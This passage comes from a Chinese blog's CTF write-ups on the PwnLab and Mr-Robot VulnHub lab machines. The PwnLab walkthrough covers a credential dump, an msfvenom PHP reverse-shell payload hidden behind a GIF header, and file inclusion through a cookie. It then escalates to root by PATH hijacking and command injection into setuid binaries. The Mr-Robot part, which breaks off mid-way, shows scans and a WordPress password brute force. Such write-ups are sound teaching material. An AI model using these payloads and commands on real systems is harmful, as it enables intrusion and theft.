class="line">&#123;</span><br><span class="line">echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;% </span><br><span class="line"></span><br><span class="line">---upload---</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;user&apos;])) &#123; die(&apos;You must be log in.&apos;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;post&apos; enctype=&apos;multipart/form-data&apos;&gt;</span><br><span class="line">&lt;input type=&apos;file&apos; name=&apos;file&apos; id=&apos;file&apos; /&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; value=&apos;Upload&apos;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">if ($_FILES[&apos;file&apos;][&apos;error&apos;] &lt;= 0) &#123;</span><br><span class="line">$filename  = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$filetype  = $_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line">$uploaddir = &apos;upload/&apos;;</span><br><span class="line">$file_ext  = strrchr($filename, &apos;.&apos;);</span><br><span class="line">$imageinfo = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">$whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">die(&apos;Not allowed extension, please upload images only.&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strpos($filetype,&apos;image&apos;) === false) &#123;</span><br><span class="line">die(&apos;Error 001&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($imageinfo[&apos;mime&apos;] != &apos;image/gif&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpeg&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpg&apos;&amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/png&apos;) &#123;</span><br><span class="line">die(&apos;Error 002&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(substr_count($filetype, &apos;/&apos;)&gt;1)&#123;</span><br><span class="line">die(&apos;Error 003&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploadfile = $uploaddir . md5(basename($_FILES[&apos;file&apos;][&apos;name&apos;])).$file_ext;</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)) &#123;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">die(&apos;Error 4&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;%</span><br></pre></td></tr></table></figure><ol start="7"><li>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</li><li><code>mysql -h 192.168.7.130 -u root -D Users -p</code>密码是config文件的那个，自行解密。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_Users |</span><br><span class="line">+-----------------+</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+------+------------------+</span><br><span class="line">| user | pass             |</span><br><span class="line">+------+------------------+</span><br><span class="line">| kent | Sld6WHVCSkpOeQ== |---JWzXuBJJNy</span><br><span class="line">| mike | U0lmZHNURW42SQ== |---SIfdsTEn6I</span><br><span class="line">| kane | aVN2NVltMkdSbw== |---iSv5Ym2GRo</span><br><span class="line">+------+------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><ol start="9"><li>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</li></ol><h3 id="绕过上传"><a href="#绕过上传" class="headerlink" title="绕过上传"></a>绕过上传</h3><ul><li>方法1：在木马上加图片标志绕过</li></ul><ol><li><code>echo GIF89a &gt; kali.gif</code></li><li><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.7.1 LPORT=7788 R &gt;&gt;kali.gif</code></li></ol><ul><li>方法2：上BurpSuite，你们比我熟练。</li></ul><ol><li>上传之后会返回一个相对路径就是文件的md5<code>upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</code></li><li>直接打开是不会解析的，但是index文件那还有一个文件包含，文件路径可以通过cookie传进去</li><li><code>curl --cookie &quot;lang=../../../../../../etc/passwd&quot; &quot;http://192.168.7.130&quot;</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/false</span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/false</span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/false</span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br><span class="line">kent:x:1001:1001:,,,:/home/kent:/bin/bash</span><br><span class="line">mike:x:1002:1002:,,,:/home/mike:/bin/bash</span><br><span class="line">kane:x:1003:1003:,,,:/home/kane:/bin/bash</span><br><span class="line">mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src="images/pwnlab.png"&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href="/"&gt;Home&lt;/a&gt; ] [ &lt;a href="?page=login"&gt;Login&lt;/a&gt; ] [ &lt;a href="?page=upload"&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">Use this server to upload and share image files inside the intranet&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;%</span><br></pre></td></tr></table></figure><ol start="4"><li>发现可以，把<code>../../../../etc/passwd</code>换刚刚上传的木马路径</li><li><code>curl --cookie &quot;lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif&quot; &quot;http://192.168.7.130&quot;</code></li><li>发现meterpreter那边已经获取到回话了。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.7.1:7788 </span><br><span class="line">[*] Meterpreter session 1 opened (192.168.7.1:7788 -&gt; 192.168.7.130:55888) at 2018-07-10 14:19:16 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol><li>还是以前的套路<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>拿数据库的密码去登录各个用户</li><li>发现kane的密码可以登录，在他的home目录找到了一个属于mike用户的ELF可执行文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ file msgmike</span><br><span class="line">file msgmike</span><br><span class="line">msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped</span><br><span class="line"></span><br><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">cat: /home/mike/msg.txt: No such file or directory</span><br></pre></td></tr></table></figure><ol start="3"><li>执行报没有mike用户目录下的文件，把他下载回来，先用Python中的<code>python -m SimpleHTTPServer</code>搭建一个简单的http服务。浏览器打开<code>192.168.7.130:8000</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] "GET / HTTP/1.1" 200 -</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] code 404, message File not found</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] "GET /favicon.ico HTTP/1.1" 404 -</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:28] "GET /msgmike HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure><ol start="4"><li><p>简单拖进IDA看看<code>cat /home/mike/msg.txt</code>它使用了带参数的系统函数，我们把环境变量改为当前目录。</p></li><li><p>可以修改PATH变量，从而将这个“cat”转换为shell：</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">cat: /home/mike/msg.txt: No such file or directory</span><br><span class="line">kane@pwnlab:~$ echo "/bin/bash" &gt; cat  </span><br><span class="line">echo "/bin/bash" &gt; cat</span><br><span class="line">kane@pwnlab:~$ ls</span><br><span class="line">ls</span><br><span class="line">cat  msgmike</span><br><span class="line">kane@pwnlab:~$ chmod 777 cat</span><br><span class="line">chmod 777 cat</span><br><span class="line">kane@pwnlab:~$ export PATH=/home/kane</span><br><span class="line">export PATH=/home/kane</span><br><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">bash: dircolors: command not found</span><br><span class="line">bash: ls: command not found</span><br><span class="line">mike@pwnlab:~$</span><br></pre></td></tr></table></figure><ol start="6"><li>现在用户变成Mike了，再把PATH改回来<code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>就可以了。现在到Mike的home目录发现有一个文件<code>msg2root</code>继续拖进IDA发现<code>&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;</code></li><li>这是把用户传进的字符串打印出来，但如果字符串里有分隔符的话就可能跟着执行了下一个命令。而且是root权限。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: id ; whoami</span><br><span class="line">id ; whoami</span><br><span class="line">id</span><br><span class="line">root</span><br><span class="line">mike@pwnlab:/home/mike$ </span><br><span class="line"></span><br><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: asdasdasdas;/bin/sh</span><br><span class="line">asdasdasdas;/bin/sh</span><br><span class="line">asdasdasdas</span><br><span class="line">id</span><br><span class="line">uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">flag.txt  messages.txt</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><hr><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.-=~=-.                                                                 .-=~=-.</span><br><span class="line">(__  <span class="keyword">_</span>)-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-(__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)  _____                             <span class="keyword">_</span>                            (<span class="keyword">_</span> ___)</span><br><span class="line">(__  <span class="keyword">_</span>) /  __ \                           | <span class="type">|                           (__</span>  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __) | <span class="type">/  \/ ___</span>  <span class="keyword">_</span> __   __ <span class="keyword">_</span> <span class="keyword">_</span> __ __ <span class="keyword">_</span>| <span class="type">|_</span> ___                      ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) | <span class="type">|    / _</span> \| <span class="type">'_</span> \ / <span class="keyword">_</span>` | <span class="type">'__</span>/ <span class="keyword">_</span>` | <span class="type">__</span>/ __|                     <span class="type">(__</span>  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___) | <span class="type">\__</span>/\ (<span class="keyword">_</span>) | <span class="type">| | | (_</span>| <span class="type">| | | (_</span>| <span class="type">| |_</span>\__ \                     (<span class="keyword">_</span> ___)</span><br><span class="line">(__  <span class="keyword">_</span>)  \____/\___/|<span class="type">_</span>| <span class="type">|_</span>|<span class="type">\__</span>, |<span class="type">_</span>|  <span class="type">\__</span>,<span class="keyword">_</span>|<span class="type">\__</span>|<span class="type">___</span>/                     (__  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __)                     __/ |                                       <span class="type">( _</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>)                    |<span class="type">___</span>/                                        (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___) <span class="keyword">If</span>  you are  reading this,  means  that you have  break 'init'  (<span class="keyword">_</span> ___)</span><br><span class="line">( <span class="keyword">_</span> __) Pwnlab.  I hope  you enjoyed  and thanks  <span class="keyword">for</span>  your <span class="built_in">time</span> doing  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) this challenge.                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)                                                                 (<span class="keyword">_</span> ___)</span><br><span class="line">( <span class="keyword">_</span> __) Please send me  your  feedback or your  writeup,  I will  love  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) reading it                                                      (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                             For sniferl4bs.com  (__  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __)                                claor@PwnLab.net - @Chronicoder  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-(<span class="keyword">_</span> ___)</span><br><span class="line">`-.<span class="keyword">_</span>.-'                                                                 `-.<span class="keyword">_</span>.-'</span><br><span class="line">#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Write-up]Mr-Robot</title>
      <link href="/2018/06/19/Write-up-Mr-Robot/"/>
      <url>/2018/06/19/Write-up-Mr-Robot/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ol><li><a href="https://download.vulnhub.com/mrrobot/mrRobot.ova" target="_blank" rel="noopener">下载地址</a></li><li>目标：找到3个Key</li><li>全文无图！因为正在<a href="https://www.bilibili.com/video/av25388820" target="_blank" rel="noopener">录像</a>。</li></ol><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol><li>用的是Host-only，所以网卡是vmnet1，IP一直是192.168.7.1/24</li><li><code>nmap -T4 192.168.7.1/24 -A</code></li></ol><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kali-team@LTS:~$ nmap -T4 192.168.7.1/24 -A</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.7.129</span><br><span class="line">Host is up (0.00075s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 47.44 seconds</span><br><span class="line"></span><br><span class="line">kali-team@LTS:~$ curl http://192.168.7.129/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>发现第一个Key【073403c8a58a1f80d943455fb30724b9】，外加一个字典，下载字典到本地。</li><li>字典很大，可能有重复的，先优化一下。<code>sort fsocity.dic | uniq &gt; list.dic</code></li><li><code>nikto -h http://192.168.7.129</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">kali-team@LTS:~/桌面$ nikto -h http://192.168.7.129</span><br><span class="line">- Nikto v2.1.5</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.7.129</span><br><span class="line">+ Target Hostname:    192.168.7.129</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2018-06-19 20:37:10 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache</span><br><span class="line">+ IP address found in the 'x-mod-pagespeed' header. The IP is "1.9.32.3".</span><br><span class="line">+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN</span><br><span class="line">+ Uncommon header 'x-mod-pagespeed' found, with contents: 1.9.32.3-4523</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.5.29</span><br><span class="line">+ Uncommon header 'x-pingback' found, with contents: http://192.168.7.129/xmlrpc.php</span><br><span class="line">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad </span><br><span class="line">+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).</span><br><span class="line">+ OSVDB-3092: /admin/: This might be interesting...</span><br><span class="line">+ Uncommon header 'tcn' found, with contents: choice</span><br><span class="line">+ OSVDB-3092: /readme: This might be interesting...</span><br><span class="line">+ Uncommon header 'link' found, with contents: &lt;http://192.168.7.129/?p=23&gt;; rel=shortlink</span><br><span class="line">+ OSVDB-3092: /license.txt: License file found may identify site software.</span><br><span class="line">+ /admin/index.html: Admin login page/section found.</span><br><span class="line">+ Cookie wordpress_test_cookie created without the httponly flag</span><br><span class="line">+ /wp-login/: Admin login page/section found.</span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br><span class="line">+ 6544 items checked: 0 error(s) and 16 item(s) reported on remote host</span><br><span class="line">+ End Time:           2018-06-19 20:39:38 (GMT8) (148 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><ol start="6"><li>通过nikto简单扫描或者用dirsearch扫一下目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kali-team@LTS:~/桌面$ dirsearch -u http://192.168.7.129 -e * |grep 200</span><br><span class="line">[20:42:35] 301 -  235B  - /admin  -&gt;  http://192.168.7.129/admin/</span><br><span class="line">[20:42:36] 200 -    1KB - /admin/</span><br><span class="line">[20:42:36] 200 -    1KB - /admin/?/login</span><br><span class="line">[20:42:38] 200 -    1KB - /admin/index</span><br><span class="line">[20:42:38] 200 -    1KB - /admin/index.html</span><br><span class="line">[20:42:41] 301 -    0B  - /admin_area/index.php  -&gt;  http://192.168.7.129/admin_area/</span><br><span class="line">[20:43:15] 200 -    0B  - /favicon.ico</span><br><span class="line">[20:43:23] 200 -    1KB - /index.html</span><br><span class="line">[20:43:25] 200 -  504KB - /intro</span><br><span class="line">[20:43:28] 200 -  309B  - /license.txt</span><br><span class="line">[20:43:50] 200 -   64B  - /readme</span><br><span class="line">[20:43:50] 200 -   64B  - /readme.html</span><br><span class="line">[20:43:51] 200 -   41B  - /robots.txt</span><br><span class="line">[20:43:56] 200 -    0B  - /sitemap</span><br><span class="line">[20:43:56] 200 -    0B  - /sitemap.xml</span><br><span class="line">[20:43:56] 200 -    0B  - /sitemap.xml.gz</span><br><span class="line">[20:44:12] 200 -    0B  - /wp-content/</span><br><span class="line">[20:44:12] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php</span><br><span class="line">[20:44:12] 200 -    3KB - /wp-login</span><br><span class="line">[20:44:12] 200 -    3KB - /wp-login.php</span><br><span class="line">[20:44:12] 200 -    3KB - /wp-login/</span><br></pre></td></tr></table></figure><ol start="7"><li>明显是一个WordPress，但是没有看到有用户发文章。打开登录页面枚举用户名，百度Mr.Robot发现黑客军团的主角叫<code>Elliot</code>，现在他提示密码错误了，说明用户名是对的。然后用刚刚发现的字典爆破。</li><li><code>wpscan -u http://192.168.7.129 --username Elliot --wordlist list.dic</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating plugins from passive detection ...</span><br><span class="line">[+] No plugins found passively</span><br><span class="line">[+] Starting the password brute forcer</span><br><span class="line">  [+] [SUCCESS] Login : Elliot Password : ER28-0652                                                                                                                                                         </span><br><span class="line"></span><br><span class="line">  Brute Forcing 'Elliot' Time: 00:01:21 &lt;=============================================================                                                                &gt; (5637 / 11452) 49.22%  ETA: 00:01:24</span><br><span class="line">  